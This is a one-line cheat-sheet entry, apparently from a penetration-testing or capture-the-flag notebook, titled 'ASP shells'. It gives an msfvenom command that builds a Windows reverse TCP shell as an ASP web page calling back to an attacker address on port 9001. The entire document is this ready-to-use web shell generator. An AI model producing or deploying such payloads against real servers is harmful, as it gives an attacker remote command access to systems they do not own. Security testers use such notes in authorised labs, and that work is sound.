# ASP shells

```sh
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.xxx LPORT=9001 -f asp -o shell.asp
```
